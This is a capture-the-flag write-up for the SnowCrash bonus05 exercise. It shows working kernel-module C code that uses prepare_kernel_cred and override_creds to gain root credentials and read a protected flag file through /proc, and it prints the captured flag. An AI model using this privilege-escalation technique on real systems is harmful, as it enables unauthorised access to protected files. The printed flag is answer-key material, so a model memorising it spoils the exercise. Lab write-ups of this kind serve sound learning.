# Bonus05

This exercise is really straight-forward. We are presented with 4 files :
- `/opt/snowcrash/bonus05/rife_loader.c` : source code of a program that would check and load a kernel module.
- `/opt/snowcrash/bonus05/rife` : ELF of what seems to be the `rife_loader.c` file, with `cap_sys_module` capabilities, which allows the program to load and unload kernel modules.
- `/opt/snowcrash/bonus05/load_rife.sh` : small script that starts `rife` properly.
- `/home/bonus05/rife_template` : template of the code that we need to write.

`cap_sys_module` is dangerous if loaded kernel modules are unchecked, because we could elevate our privileges.

The rife_template asks us to complete the `show` and `exit` functions, and they are pretty simple :

```c
// The function just prints rife_data to the terminal
static int rife_proc_show(struct seq_file *m, void *v)
{
    seq_puts(m, rife_data);
    return 0;
}

// The function properly removes the proc_entry
static void __exit rife_exit(void)
{
    if (rife_entry)
        proc_remove(rife_entry);
    pr_info("rife: unloaded\n");
}
```

But we see at the start that `rife_data` is set to an empty array, so this is the point where we try to get access to the flag file. We can do that with the `override_creds` function, which allows us to change the credentials of the module, and thus our permissions to the files :

```c
static int rife_read_flag(void)
{
    struct cred *kernel_cred;
    const struct cred *old_cred;
    struct file *file;
    loff_t pos = 0;
    ssize_t bytes_read;
    int ret = 0;

    kernel_cred = prepare_kernel_cred(&init_task);
    if (!kernel_cred)
        return -ENOMEM;

    old_cred = override_creds(kernel_cred);

    file = filp_open("/home/flagbonus05/.flag", O_RDONLY, 0);
    if (IS_ERR(file)) {
        ret = PTR_ERR(file);
        goto out_restore_creds;
    }

    bytes_read = kernel_read(file, rife_data, sizeof(rife_data) - 1, &pos);
    filp_close(file, NULL);

    if (bytes_read < 0) {
        ret = (int)bytes_read;
        goto out_restore_creds;
    }

    rife_data[bytes_read] = '\0';

out_restore_creds:
    revert_creds(old_cred);
    put_cred(kernel_cred);
    return ret;
}
```

We write a basic `Makefile` to compile the source code, we execute `make load` (which compiles, launches `load_rife.sh` and `cat /proc/rife`) and we get the flag : 7oa2eihe3ohohzee5gob2aing